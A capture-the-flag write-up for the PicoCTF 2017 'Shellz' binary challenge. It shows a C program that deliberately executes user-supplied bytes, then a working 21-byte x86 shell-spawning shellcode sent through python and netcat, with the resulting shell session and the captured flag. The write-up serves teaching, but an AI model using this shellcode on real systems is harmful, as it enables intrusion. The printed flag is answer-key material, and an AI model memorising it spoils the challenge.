# PicoCTF 2017 - Level 2 - Shellz

**Category:** Binary **Points:** 55

**Description:**

> You no longer have an easy thing to call, but you have more space. Program: shellz! 
> Source. Connect on shell2017.picoctf.com:24630.

We are given the following code:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define AMOUNT_OF_STUFF 40

//Learned my lesson! No more easy flags
/*void win(){
    system("/bin/cat ./flag.txt");    
}*/


void vuln(){
    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    if(stuff == MAP_FAILED){
        printf("Failed to get space. Please talk to admin\n");
        exit(0);
    }
    printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
    fflush(stdout);
    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
    if(len == 0){
        printf("You didn't give me anything :(");
        exit(0);
    }
    void (*func)() = (void (*)())stuff;
    func();      
}

int main(int argc, char*argv[]){
    printf("My mother told me to never accept things from strangers\n");
    printf("How bad could running a couple bytes be though?\n");
    fflush(stdout);
    vuln();
    return 0;
}
```

In here, we see a char pointer 'stuff' is being created with a 40 byte length. This is
followed by a few lines where the program is printing a message to the user and reading
the user's input, which is then stored at the location of stuff. The most important line
to note is the following:

```
void (*func)() = (void (*)())stuff;
```

Here we see that a function is being called at the location of stuff, which coincidentally
is where we can write whatever we choose. Higher up in the code the function win shows
that we need to cat ./flag.txt, so if we can use the stuff execution to call /bin/cat
this should be fairly easy. The hint tells us we can find existing shellcode, so we can
search online. 

http://shell-storm.org/shellcode/

Looking around, we can see the shellcode scripts have byte lengths, so we want to find
something shorter. I chose this 21 byte code by IPV
http://shell-storm.org/shellcode/files/shellcode-575.php

We need to get this hex code into the server, so we'll use python and netcat. However,
if we attempt to send this code by itself, the server will close after receiving input.
In order to keep the connection open, we need to append "cat -" so that we can keep cat
looking for input from STDIN. Once we've added this, we can use the program as a shell
to cat our file.

```
$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; cat -) | nc shell2017.picoctf.com 24630
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
ls
flag.txt
shellz
shellz_no_aslr
xinetd_wrapper.sh
cat flag.txt
e7ab8af95673759fa3568c3c38098f16
```

And voila, our flag!

